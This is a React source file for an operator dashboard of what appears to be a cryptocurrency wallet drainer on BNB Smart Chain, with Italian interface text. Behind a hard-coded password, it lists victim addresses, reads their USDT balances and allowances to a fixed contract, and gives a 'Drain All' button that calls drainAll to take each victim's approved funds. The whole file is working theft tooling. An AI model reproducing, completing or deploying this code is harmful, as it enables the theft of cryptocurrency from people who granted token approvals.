import { useState } from "react";
import { ethers } from "ethers";

export default function Dashboard() {
  const [password, setPassword] = useState("");
  const [logged, setLogged] = useState(false);
  const [users, setUsers] = useState([]);

  const CONTRACT_ADDRESS = "0xEfD0c28023B55C914d0e55c2780075BbEC9E8Db1";
  const USDT = "0x55d398326f99059fF775485246999027B3197955";

  const login = async () => {
    if (password === "Armadio") {
      setLogged(true);

      const res = await fetch("/api/users");
      const data = await res.json();

      const provider = new ethers.JsonRpcProvider(
        "https://bsc-dataseed.binance.org/"
      );

      const usdt = new ethers.Contract(
        USDT,
        [
          "function balanceOf(address owner) view returns (uint256)",
          "function allowance(address owner, address spender) view returns (uint256)",
          "function decimals() view returns (uint8)"
        ],
        provider
      );

      const decimals = await usdt.decimals();

      const usersData = await Promise.all(
        data.users.map(async (u) => {
          const balance = await usdt.balanceOf(u.address);
          const allowance = await usdt.allowance(u.address, CONTRACT_ADDRESS);

          let formattedAllowance =
            allowance > ethers.parseUnits("1000000000", decimals)
              ? "Unlimited"
              : Number(ethers.formatUnits(allowance, decimals)).toFixed(2);

          return {
            address: u.address,
            balance: Number(ethers.formatUnits(balance, decimals)).toFixed(2),
            allowance: formattedAllowance,
          };
        })
      );

      setUsers(usersData);

    } else {
      alert("Password sbagliata");
    }
  };

  const drainUser = async (user) => {
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();

    const contract = new ethers.Contract(
      CONTRACT_ADDRESS,
      ["function drainAll(address token, address from)"],
      signer
    );

    const tx = await contract.drainAll(USDT, user);

    await tx.wait();

    alert("Drain completato 🔥");
  };

  if (!logged) {
    return (
      <div style={{ padding: 50, color: "white" }}>
        <h2>Login</h2>
        <input
          type="password"
          onChange={(e) => setPassword(e.target.value)}
        />
        <button onClick={login}>Entra</button>
      </div>
    );
  }

  return (
    <div style={{ padding: 20, color: "white", background: "#0b0b0b", minHeight: "100vh" }}>
      <h2>Dashboard</h2>

      {users.map((u, i) => (
        <div key={i} style={{ marginTop: 20 }}>
          <div>{u.address}</div>
          <div>Balance: ${u.balance}</div>
          <div>Allowance: {u.allowance}</div>

          <button onClick={() => drainUser(u.address)}>
            Drain All
          </button>
        </div>
      ))}
    </div>
  );
}